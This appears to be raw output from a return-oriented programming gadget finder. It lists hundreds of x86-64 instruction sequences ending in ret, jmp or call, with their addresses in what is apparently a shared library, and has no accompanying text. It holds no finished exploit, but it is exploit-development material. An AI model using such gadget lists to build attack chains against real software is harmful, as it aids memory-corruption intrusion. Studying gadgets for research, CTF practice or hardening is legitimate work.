0x00002aaaaabf8b2f : add cl, byte ptr [rbp + 0xf] ; ret
0x00002aaaaab1235d : add cl, byte ptr [rbp - 0x57f2faf] ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaabbc26e : add cl, byte ptr [rbp - 0x73] ; std ; add byte ptr [rcx], bh ; ret
0x00002aaaaab5d915 : add cl, byte ptr [rbp - 0x77] ; ret
0x00002aaaaac2fb52 : add cl, byte ptr [rbx + 0x257890e] ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab76f68 : add cl, byte ptr [rbx + 0x42890341] ; add ecx, dword ptr [rax - 0x77] ; clc ; ret
0x00002aaaaac3f495 : add cl, byte ptr [rbx + 0x42890541] ; add eax, 0x8428d48 ; ret
0x00002aaaaab7700c : add cl, byte ptr [rbx + 0x42890841] ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaabd2462 : add cl, byte ptr [rbx - 0x76b7ffd4] ; ret 0xb6e9
0x00002aaaaabaa906 : add cl, byte ptr [rcx + 0x39488a0c] ; ret
0x00002aaaaab40cf2 : add cl, byte ptr [rcx + 0x440f48c3] ; rol dword ptr [rax], 1 ; ret
0x00002aaaaac03187 : add cl, byte ptr [rcx + 0x55ff41da] ; adc byte ptr [rcx], bh ; ret
0x00002aaaaac7585a : add cl, byte ptr [rcx + 0xe] ; nop ; add dword ptr [rsi + rcx + 0x10], ecx ; je 0x1a0878 ; ret
0x00002aaaaabf8118 : add cl, byte ptr [rcx + rcx*4 + 0x10] ; lea eax, dword ptr [r9 + r8 + 2] ; pop rbx ; ret
0x00002aaaaab9e3ce : add cl, byte ptr [rcx - 0x3b7cb710] ; ret
0x00002aaaaabb511e : add cl, byte ptr [rcx - 0x7d] ; ret 0x4810
0x00002aaaaab8c98b : add cl, byte ptr [rcx - 0x7d] ; ret 0x4c01
0x00002aaaaac09472 : add cl, byte ptr [rdi] ; enter 0x4189, 0x54 ; mov eax, 1 ; ret
0x00002aaaaac09542 : add cl, byte ptr [rdi] ; enter 0x4189, 0x58 ; mov eax, 1 ; ret
0x00002aaaaab02d54 : add cl, byte ptr [rdi] ; mov bh, 0xc0 ; ret
0x00002aaaaabcbb3f : add cl, byte ptr [rdi] ; ret 0x8348
0x00002aaaaabcba97 : add cl, byte ptr [rdi] ; ret 0xfc3
0x00002aaaaabe5855 : add cl, byte ptr [rdi] ; test cl, bh ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab3a898 : add cl, byte ptr [rdi] ; test dword ptr [rax], esi ; adc dword ptr [rax], eax ; add dh, dh ; ret
0x00002aaaaab55ed0 : add cl, byte ptr [rdi] ; test dword ptr [rcx], edi ; add dword ptr [rax], eax ; add byte ptr [rbp + 0x39], cl ; ret 0x976
0x00002aaaaab42005 : add cl, byte ptr [rdi] ; xchg eax, ebp ; ret 0x5389
0x00002aaaaac1ea4b : add cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xf40
0x00002aaaaab7edb3 : add cl, byte ptr [rdi] ; xchg eax, esp ; ret 0x8444
0x00002aaaaab76efa : add cl, byte ptr [rdx + 0x42880241] ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x00002aaaaac3f453 : add cl, byte ptr [rdx + 0x42880441] ; add al, 0x48 ; lea eax, dword ptr [rdx + 4] ; ret
0x00002aaaaab76f28 : add cl, byte ptr [rdx + 0x42880441] ; add al, 0x48 ; mov eax, edi ; ret
0x00002aaaaab76fac : add cl, byte ptr [rdx + 0x42880841] ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaaad54b0 : add cl, byte ptr [rdx] ; add dword ptr [rax + rax*4], ecx ; push rbx ; add al, 4 ; ret 0x6080
0x00002aaaaac8ae00 : add cl, byte ptr [rsi + rcx + 0x28] ; ret
0x00002aaaaac832d0 : add cl, ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab20b45 : add cl, ch ; movabs eax, dword ptr [0xfffb5885c7fffffd] ; call qword ptr [rax]
0x00002aaaaab3c497 : add cl, ch ; pop rdi ; ret 0xffff
0x00002aaaaab022c7 : add cl, ch ; ret
0x00002aaaaabd9058 : add cl, ch ; ret 0xf771
0x00002aaaaab35228 : add cl, ch ; ret 0xffb8
0x00002aaaaab3c734 : add cl, ch ; ret 0xffbf
0x00002aaaaab72c37 : add cl, ch ; ret 0xffd3
0x00002aaaaab15f85 : add cl, ch ; ret 0xffec
0x00002aaaaab06d06 : add cl, ch ; ret 0xfff1
0x00002aaaaab72b03 : add cl, ch ; ret 0xfff5
0x00002aaaaab000b1 : add cl, ch ; ret 0xfffb
0x00002aaaaabc5053 : add cl, ch ; ret 0xfffd
0x00002aaaaab55206 : add cl, ch ; ret 0xfffe
0x00002aaaaab35851 : add cl, ch ; ret 0xffff
0x00002aaaaabe9f76 : add cl, cl ; ret
0x00002aaaaac9097f : add cl, dh ; or byte ptr [rbx], al ; ret
0x00002aaaaac78450 : add dh, ah ; ret
0x00002aaaaab1aaf8 : add dh, al ; add al, 0x10 ; add bl, dh ; ret
0x00002aaaaab7317f : add dh, al ; add dword ptr [rax], eax ; mov rcx, r8 ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaaba9d2f : add dh, al ; or byte ptr [r10], r8b ; xor eax, eax ; ret
0x00002aaaaaba9dff : add dh, al ; or byte ptr [r8 + r15*4], r11b ; add al, byte ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaaba9d8f : add dh, al ; or byte ptr [r9], r11b ; mov eax, 1 ; ret
0x00002aaaaac5e91b : add dh, bh ; jmp rdi
0x00002aaaaac54677 : add dh, bh ; xlatb ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x00002aaaaac2fd03 : add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaaaeef2f : add dh, bl ; ret
0x00002aaaaab7e03b : add dh, byte ptr [rax] ; in eax, dx ; mov byte ptr [rdi + 3], ch ; ret
0x00002aaaaac783f6 : add dh, byte ptr [rbp + 0x41180e0a] ; ret
0x00002aaaaac103a8 : add dh, byte ptr [rbp + rbp + 0x48] ; add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab6dfcd : add dh, byte ptr [rbp + rbp + 0xf] ; mov dh, 0x45 ; ret
0x00002aaaaabac0c8 : add dh, byte ptr [rbp - 0x2b] ; jmp 0xd7094
0x00002aaaaac08622 : add dh, byte ptr [rbx + rcx - 0x48] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac752e5 : add dh, byte ptr [rcx + 0xa] ; ret
0x00002aaaaac8adc5 : add dh, byte ptr [rdx + 0xa] ; ret
0x00002aaaaac46e82 : add dh, byte ptr [rdx + 0xb] ; mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x00002aaaaab7ea4f : add dh, byte ptr [rdx + 8] ; mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x00002aaaaab6d9b3 : add dh, byte ptr [rdx + rbp + 0xf] ; mov dh, 0x55 ; ret
0x00002aaaaab71f14 : add dh, byte ptr [rsp + rbp + 0xf] ; mov dh, 0x45 ; ret
0x00002aaaaab6ffd0 : add dh, byte ptr [rsp + rbp + 0xf] ; mov dh, 0x55 ; ret
0x00002aaaaab71f13 : add dh, byte ptr cs:[rsp + rbp + 0xf] ; mov dh, 0x45 ; ret
0x00002aaaaac08621 : add dh, byte ptr ds:[rbx + rcx - 0x48] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaaaeef17 : add dh, cl ; ret
0x00002aaaaac5e913 : add dh, dh ; ljmp ptr [rcx - 0x3c000500] ; add dh, bh ; jmp rdi
0x00002aaaaaaeef47 : add dh, dh ; ret
0x00002aaaaabc0533 : add dh, dh ; ret 0x4002
0x00002aaaaaaf8ff6 : add dh, dh ; ret 0x4801
0x00002aaaaab63828 : add dh, dh ; ret 0x7404
0x00002aaaaabb8a09 : add dh, dh ; ret 0x7408
0x00002aaaaab42b9f : add dh, dh ; ret 0x7420
0x00002aaaaac44d87 : add dh, dh ; ret 0x7501
0x00002aaaaac44d94 : add dh, dh ; ret 0x7502
0x00002aaaaab36ba4 : add dh, dh ; ret 0x7504
0x00002aaaaac44d59 : add dh, dh ; ret 0x7510
0x00002aaaaac44d66 : add dh, dh ; ret 0x7520
0x00002aaaaac44d73 : add dh, dh ; ret 0x7540
0x00002aaaaabcd127 : add dh, dh ; ret 0xf01
0x00002aaaaab55ecd : add dh, dh ; ret 0xf02
0x00002aaaaabf6d95 : add dh, dh ; ret 0xf04
0x00002aaaaab2921f : add dh, dh ; ret 0xf08
0x00002aaaaab75702 : add dh, dh ; ret 0xf20
0x00002aaaaab7570b : add dh, dh ; ret 0xf40
0x00002aaaaac5c44d : add dh, dl ; call qword ptr [rax]
0x00002aaaaac5c445 : add dh, dl ; call rax
0x00002aaaaac5c42d : add dh, dl ; jmp qword ptr [rax]
0x00002aaaaac5c449 : add dh, dl ; push rax ; add dh, dl ; call qword ptr [rax]
0x00002aaaaabde2ae : add dil, byte ptr [rcx] ; ret
0x00002aaaaab8f639 : add dil, r15b ; ret
0x00002aaaaac69794 : add dl, al ; sti ; call qword ptr [rax - 0x3d]
0x00002aaaaac6f3d9 : add dl, bh ; inc dword ptr [rsp + rbp + 0x3440002] ; cli ; call rsp
0x00002aaaaac69738 : add dl, bl ; sti ; jmp rax
0x00002aaaaac740df : add dl, byte ptr [rsi + rcx + 0xe4c01a0] ; and byte ptr [rcx + 0xa], al ; ret
0x00002aaaaac7a2e5 : add dl, ch ; ret
0x00002aaaaac5c3f9 : add dl, dh ; call qword ptr [rax]
0x00002aaaaac5c3ed : add dl, dh ; inc dword ptr [rax - 0x4f000e00] ; add dl, dh ; jmp rax
0x00002aaaaac5c3f5 : add dl, dh ; jmp rax
0x00002aaaaab0ffe7 : add dl, dh ; movups xmm0, xmmword ptr [rsp + 8] ; add rsp, 0x18 ; ret
0x00002aaaaab1016f : add dl, dh ; movups xmmword ptr [rbx], xmm0 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0994f : add dl, dh ; mulps xmm1, xmm0 ; movapd xmm0, xmm1 ; ret
0x00002aaaaac5c3f1 : add dl, dh ; push qword ptr [rax - 0x1f000e00] ; add dl, dh ; call qword ptr [rax]
0x00002aaaaac908b0 : add dword ptr [0xfffffffff501c501], ecx ; add al, byte ptr [rax] ; ret
0x00002aaaaac6d3d5 : add dword ptr [eax], eax ; test byte ptr [rdx - 0xb], al ; jmp rsp
0x00002aaaaac7b0c4 : add dword ptr [r14], 3 ; mov byte ptr [rcx], al ; ret
0x00002aaaaaafbe56 : add dword ptr [r8 + 0x39], r9d ; ret
0x00002aaaaabe2284 : add dword ptr [r8 + 0x3c63af9], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab9464c : add dword ptr [r8 - 0x73], ecx ; jl 0xbf6ab ; ror byte ptr [rax - 0x46], 1 ; ret
0x00002aaaaab1b274 : add dword ptr [r8 - 0x7d], ecx ; ret
0x00002aaaaab4170e : add dword ptr [r8 - 0x7d], ecx ; ret 0x4502
0x00002aaaaab41e92 : add dword ptr [r8 - 0x7d], ecx ; ret 0x8508
0x00002aaaaab58ff2 : add dword ptr [r8], eax ; add byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; ret
0x00002aaaaac84115 : add dword ptr [r8], eax ; call 0x241ae64b
0x00002aaaaac6cec5 : add dword ptr [r8], eax ; in al, 0x46 ; jmp rsp
0x00002aaaaac8472d : add dword ptr [r8], r8d ; loopne 0x1af78b ; cmc ; call qword ptr [rdx]
0x00002aaaaac84505 : add dword ptr [r8], r8d ; pop rax ; cmc ; jmp rax
0x00002aaaaab8e772 : add dword ptr [rax + 0x10], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaaafb486 : add dword ptr [rax + 0x19], ecx ; ror byte ptr [rax - 0x7d], cl ; ret 0x4906
0x00002aaaaab4cccc : add dword ptr [rax + 0x19], ecx ; ror byte ptr [rax - 0x7d], cl ; ret 0x8001
0x00002aaaaaba9dd8 : add dword ptr [rax + 0x1b807], ecx ; add byte ptr [rax], al ; ret
0x00002aaaaac3f401 : add dword ptr [rax + 0x28d4802], ecx ; ret
0x00002aaaaabad9ef : add dword ptr [rax + 0x29], ecx ; ret 0x8348
0x00002aaaaaafbaf7 : add dword ptr [rax + 0x39], ecx ; ret
0x00002aaaaabad403 : add dword ptr [rax + 0x39], ecx ; ret 0x1176
0x00002aaaaab8bda7 : add dword ptr [rax + 0x39], ecx ; ret 0x2973
0x00002aaaaabcda23 : add dword ptr [rax + 0x39], ecx ; ret 0x674
0x00002aaaaabb5ad6 : add dword ptr [rax + 0x39], ecx ; ret 0x820f
0x00002aaaaab1e5f0 : add dword ptr [rax + 0x39], ecx ; ret 0x8948
0x00002aaaaab26fec : add dword ptr [rax + 0x39], ecx ; ret 0x8d0f
0x00002aaaaabcda17 : add dword ptr [rax + 0x39], ecx ; ret 0xc72
0x00002aaaaabad4d3 : add dword ptr [rax + 0x39], ecx ; ret 0xe775
0x00002aaaaaba7a95 : add dword ptr [rax + 0x39], ecx ; ret 0xe777
0x00002aaaaab8d222 : add dword ptr [rax + 0x39], ecx ; ret 0xec77
0x00002aaaaab73e10 : add dword ptr [rax + 0x39], ecx ; ret 0xf077
0x00002aaaaab1d083 : add dword ptr [rax + 0x39], ecx ; sal byte ptr [rbp - 0x11], 1 ; xor eax, eax ; ret
0x00002aaaaab1d21b : add dword ptr [rax + 0x39], ecx ; salc ; jne 0x48218 ; xor eax, eax ; ret
0x00002aaaaabe2285 : add dword ptr [rax + 0x3c63af9], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabe225f : add dword ptr [rax + 0x470f3af9], eax ; ret 0xc084
0x00002aaaaab99e25 : add dword ptr [rax + 0x63], ecx ; fisttp dword ptr [rax + 0x39] ; ret
0x00002aaaaabd60f1 : add dword ptr [rax + 0x63], ecx ; ret 0x8941
0x00002aaaaab1c053 : add dword ptr [rax + 0x7500017b], eax ; test byte ptr [rax - 0x77], 0xd8 ; pop rbx ; ret
0x00002aaaaabd3d73 : add dword ptr [rax + 0xf], ecx ; mov esi, 0xf233c03 ; xchg eax, ebp ; ret 0x2f3c
0x00002aaaaabba11f : add dword ptr [rax + 0xf], ecx ; ret
0x00002aaaaab3932a : add dword ptr [rax + 1], ecx ; ret
0x00002aaaaaaf5622 : add dword ptr [rax + 1], ecx ; ror byte ptr [rax - 0x77], 1 ; ret 0xe281
0x00002aaaaabaa059 : add dword ptr [rax + 1], edi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba9d53 : add dword ptr [rax + 1], edi ; ret
0x00002aaaaaad54b2 : add dword ptr [rax + rax*4], ecx ; push rbx ; add al, 4 ; ret 0x6080
0x00002aaaaabf833c : add dword ptr [rax + rax*8 + 0x38414f74], eax ; ret 0x5a74
0x00002aaaaaba36af : add dword ptr [rax + rax*8 - 0x49f0f78c], eax ; add cl, byte ptr [rax - 0x7d] ; ret 0x8301
0x00002aaaaac29644 : add dword ptr [rax + rax], eax ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac76b3e : add dword ptr [rax + rbp*2], 0xa ; ret
0x00002aaaaab6d9a5 : add dword ptr [rax + rdi + 0xf], esi ; mov dh, 0x55 ; ret 0x8349
0x00002aaaaac804f6 : add dword ptr [rax + rsi*2], 0xa ; ret
0x00002aaaaabef876 : add dword ptr [rax - 0x18], edx ; ret
0x00002aaaaaba7e07 : add dword ptr [rax - 0x6bf0a206], eax ; ret 0xb60f
0x00002aaaaaba7e06 : add dword ptr [rax - 0x6bf0a206], r8d ; ret 0xb60f
0x00002aaaaab04453 : add dword ptr [rax - 0x6bf0d006], eax ; ret 0xb60f
0x00002aaaaabda232 : add dword ptr [rax - 0x73], ecx ; add cl, byte ptr [r8 + 0x39] ; ret 0xf48
0x00002aaaaac3ceda : add dword ptr [rax - 0x73], ecx ; add qword ptr [rdi], rcx ; test dword ptr [rbx + 3], ecx ; add byte ptr [rax], al ; ret
0x00002aaaaab7a9c5 : add dword ptr [rax - 0x73], ecx ; jg 0xa59d6 ; jne 0xa628b ; ret
0x00002aaaaab7c068 : add dword ptr [rax - 0x73], ecx ; jg 0xa7079 ; jne 0xa7a9b ; ret
0x00002aaaaab9464d : add dword ptr [rax - 0x73], ecx ; jl 0xbf6aa ; ror byte ptr [rax - 0x46], 1 ; ret
0x00002aaaaabc4455 : add dword ptr [rax - 0x75], ecx ; and al, 0x18 ; mov rdx, rax ; jmp 0xef49b
0x00002aaaaabab308 : add dword ptr [rax - 0x75], ecx ; push rbp ; or byte ptr [rcx - 0x75], cl ; je 0xd6340 ; or byte ptr [rcx], ch ; ret
0x00002aaaaab76ed6 : add dword ptr [rax - 0x776b7fe], ecx ; ret
0x00002aaaaac3b062 : add dword ptr [rax - 0x77], ecx ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x00002aaaaab72d66 : add dword ptr [rax - 0x77], ecx ; clc ; ret
0x00002aaaaab83bb1 : add dword ptr [rax - 0x77], ecx ; fisttp qword ptr [rax - 0x77] ; ret
0x00002aaaaabaf4f5 : add dword ptr [rax - 0x77], ecx ; mov ah, 0x24 ; cwde ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x947c
0x00002aaaaabaf7b8 : add dword ptr [rax - 0x77], ecx ; mov esp, 0xa824 ; add byte ptr [rcx], bh ; ret 0x8d0f
0x00002aaaaab53809 : add dword ptr [rax - 0x77], ecx ; pop r8 ; mov dword ptr [rdi + 4], eax ; ret
0x00002aaaaab50428 : add dword ptr [rax - 0x77], ecx ; push rbx ; or byte ptr [rdi], cl ; mov dh, 0 ; pop rbx ; ret
0x00002aaaaab4cf5d : add dword ptr [rax - 0x77], ecx ; push rdi ; or byte ptr [rdi], cl ; mov dh, 0 ; ret
0x00002aaaaabaf65c : add dword ptr [rax - 0x77], ecx ; pushfq ; and al, 0xa0 ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x8d0f
0x00002aaaaab5f921 : add dword ptr [rax - 0x77], ecx ; ret
0x00002aaaaab3fd94 : add dword ptr [rax - 0x77], ecx ; ret 0x2b76
0x00002aaaaabc516c : add dword ptr [rax - 0x77], ecx ; ret 0x349
0x00002aaaaaba3ce0 : add dword ptr [rax - 0x77], ecx ; ret 0x57e9
0x00002aaaaabb6102 : add dword ptr [rax - 0x77], ecx ; ret 0x75e8
0x00002aaaaab4e3ef : add dword ptr [rax - 0x77], ecx ; ret 0x850f
0x00002aaaaaba4890 : add dword ptr [rax - 0x77], ecx ; ret 0x9aeb
0x00002aaaaabe2b58 : add dword ptr [rax - 0x77], ecx ; sub r14b, r8b ; add byte ptr [rax], ah ; jmp 0x10db2e
0x00002aaaaabf8020 : add dword ptr [rax - 0x78], eax ; ja 0x12302b ; ret
0x00002aaaaac5ca73 : add dword ptr [rax - 0x78], esp ; jmp rdx
0x00002aaaaab283f6 : add dword ptr [rax - 0x7b], ecx ; dec dword ptr [rcx + 0xf50244c] ; ret 0x4c8b
0x00002aaaaac4101a : add dword ptr [rax - 0x7d], ecx ; fdivr st(7) ; ret
0x00002aaaaabe225b : add dword ptr [rax - 0x7d], ecx ; lock add dword ptr [rax + 0x470f3af9], eax ; ret 0xc084
0x00002aaaaaba5a19 : add dword ptr [rax - 0x7d], ecx ; mov dword ptr [rcx], 0xdf75d284 ; ret
0x00002aaaaab6b7d0 : add dword ptr [rax - 0x7d], ecx ; out dx, al ; add dword ptr [rbp - 0xf], esi ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab6b878 : add dword ptr [rax - 0x7d], ecx ; out dx, al ; add dword ptr [rbp - 0xf], esi ; xor eax, eax ; ret
0x00002aaaaaaf71f6 : add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaabf6a58 : add dword ptr [rax - 0x7d], ecx ; ret 0x3904
0x00002aaaaabac663 : add dword ptr [rax - 0x7d], ecx ; ret 0x3d01
0x00002aaaaab1b3dc : add dword ptr [rax - 0x7d], ecx ; ret 0x4101
0x00002aaaaabb274f : add dword ptr [rax - 0x7d], ecx ; ret 0x4104
0x00002aaaaabbdbe2 : add dword ptr [rax - 0x7d], ecx ; ret 0x4108
0x00002aaaaabb5c12 : add dword ptr [rax - 0x7d], ecx ; ret 0x4404
0x00002aaaaab4170f : add dword ptr [rax - 0x7d], ecx ; ret 0x4502
0x00002aaaaab0ce49 : add dword ptr [rax - 0x7d], ecx ; ret 0x4801
0x00002aaaaaba7c23 : add dword ptr [rax - 0x7d], ecx ; ret 0x4810
0x00002aaaaaaf646c : add dword ptr [rax - 0x7d], ecx ; ret 0x4830
0x00002aaaaab9bca6 : add dword ptr [rax - 0x7d], ecx ; ret 0x4948
0x00002aaaaaaf8c9e : add dword ptr [rax - 0x7d], ecx ; ret 0x4d02
0x00002aaaaab1224e : add dword ptr [rax - 0x7d], ecx ; ret 0x6610
0x00002aaaaabf6d88 : add dword ptr [rax - 0x7d], ecx ; ret 0x8301
0x00002aaaaaba2fdb : add dword ptr [rax - 0x7d], ecx ; ret 0x8401
0x00002aaaaab8b55c : add dword ptr [rax - 0x7d], ecx ; ret 0x8504
0x00002aaaaab41e93 : add dword ptr [rax - 0x7d], ecx ; ret 0x8508
0x00002aaaaabcf581 : add dword ptr [rax - 0x7d], ecx ; ret 0xe801
0x00002aaaaab31b5a : add dword ptr [rax - 0x7d], ecx ; ret 0xf01
0x00002aaaaabbb99a : add dword ptr [rax - 0x7d], ecx ; ret 0xf10
0x00002aaaaabad694 : add dword ptr [rax - 0x7d], ecx ; rol byte ptr [rcx], 0x83 ; ret 0x4001
0x00002aaaaababe8e : add dword ptr [rax - 0x7d], ecx ; rol byte ptr [rsp + rax*2], 0x29 ; ret 0x5089
0x00002aaaaab505da : add dword ptr [rax], 0 ; add bl, ch ; fucomp st(0) ; ret
0x00002aaaaac78095 : add dword ptr [rax], 0xed52a800 ; jmp qword ptr [rsi]
0x00002aaaaabddde4 : add dword ptr [rax], 1 ; ret
0x00002aaaaac6cbde : add dword ptr [rax], eax ; adc al, 0x52 ; call rsp
0x00002aaaaac89c7e : add dword ptr [rax], eax ; adc bh, 0xf6 ; call qword ptr [rdi]
0x00002aaaaac8384e : add dword ptr [rax], eax ; adc bh, bh ; hlt ; call rsi
0x00002aaaaac84efe : add dword ptr [rax], eax ; adc byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac83dbe : add dword ptr [rax], eax ; adc byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac82a0e : add dword ptr [rax], eax ; adc cl, 0xf4 ; jmp rcx
0x00002aaaaac6d32e : add dword ptr [rax], eax ; add al, 0x21 ; cmc ; jmp rsp
0x00002aaaaac6ccc6 : add dword ptr [rax], eax ; add al, 0x90 ; jmp rsp
0x00002aaaaac6c5e6 : add dword ptr [rax], eax ; add al, 0x92 ; out dx, eax ; jmp rsp
0x00002aaaaac6d186 : add dword ptr [rax], eax ; add al, 8 ; hlt ; call rsp
0x00002aaaaac05241 : add dword ptr [rax], eax ; add al, ch ; push rdi ; imul dh ; dec dword ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaaba4875 : add dword ptr [rax], eax ; add al, ch ; ret
0x00002aaaaab7285a : add dword ptr [rax], eax ; add bh, dh ; ret 0
0x00002aaaaabf7d2c : add dword ptr [rax], eax ; add bl, al ; mov eax, 0x100 ; ret
0x00002aaaaabf7d32 : add dword ptr [rax], eax ; add bl, al ; mov eax, 0x102 ; ret
0x00002aaaaabf7d24 : add dword ptr [rax], eax ; add bl, al ; ret
0x00002aaaaab42cba : add dword ptr [rax], eax ; add bl, dh ; ret
0x00002aaaaaafe448 : add dword ptr [rax], eax ; add byte ptr [rax + 0x29], cl ; ret 0x349
0x00002aaaaaafd550 : add dword ptr [rax], eax ; add byte ptr [rax + 0x29], cl ; ret 0xe183
0x00002aaaaab440bd : add dword ptr [rax], eax ; add byte ptr [rax + 0x39], cl ; ret
0x00002aaaaab40d68 : add dword ptr [rax], eax ; add byte ptr [rax + 0x63], cl ; ret 0x3948
0x00002aaaaab618a3 : add dword ptr [rax], eax ; add byte ptr [rax + 0xf], cl ; mov ebp, 0xf80148c0 ; ret
0x00002aaaaac10da6 : add dword ptr [rax], eax ; add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaab5bacc : add dword ptr [rax], eax ; add byte ptr [rax - 0x39], cl ; ret 0xffdf
0x00002aaaaabd31cc : add dword ptr [rax], eax ; add byte ptr [rax - 0x3f7cb7f0], cl ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaab55c48 : add dword ptr [rax], eax ; add byte ptr [rax - 0x73], cl ; push rax ; adc dh, dh ; ret 0xf0f
0x00002aaaaaba3751 : add dword ptr [rax], eax ; add byte ptr [rax - 0x75], cl ; mov ebp, 0xfffffcf8 ; call r12
0x00002aaaaac17a02 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; adc byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00002aaaaac17c2d : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; add ebx, dword ptr [rax + 0x5a] ; pop rbx ; ret
0x00002aaaaab91e74 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rbx ; call 0x8916b
0x00002aaaaab58ff3 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; ret
0x00002aaaaab3b504 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabb7a58 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaab6b4fe : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaab01535 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8b41
0x00002aaaaac179ba : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; sbb byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00002aaaaab47b08 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rdi*4 - 0xa] ; ret 0x7508
0x00002aaaaac4149d : add dword ptr [rax], eax ; add byte ptr [rax - 0x7cb7fec8], al ; fdivr st(7) ; ret
0x00002aaaaab58f09 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaab59030 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x00002aaaaab0095f : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabf7252 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x3904
0x00002aaaaab57187 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4117
0x00002aaaaab8ae1a : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaac19d0d : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab093b7 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x00002aaaaaafb91d : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x8901
0x00002aaaaab622ce : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaac201bf : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac19c61 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaaafe7fa : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx + rcx*2], 0x39 ; ret
0x00002aaaaab4686a : add dword ptr [rax], eax ; add byte ptr [rax - 0x7f], cl ; ret
0x00002aaaaab47090 : add dword ptr [rax], eax ; add byte ptr [rax - 1], bh ; pop rbx ; ret
0x00002aaaaaaf6901 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaac5467a : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x00002aaaaac5382a : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rsp
0x00002aaaaac53652 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac5364a : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d4
0x00002aaaaac53de2 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d5
0x00002aaaaab2e81e : add dword ptr [rax], eax ; add byte ptr [rax], al ; add rax, rcx ; jmp rax
0x00002aaaaab22a4c : add dword ptr [rax], eax ; add byte ptr [rax], al ; add rax, rsi ; jmp rax
0x00002aaaaac02f63 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0f32f : add dword ptr [rax], eax ; add byte ptr [rax], al ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab436b6 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
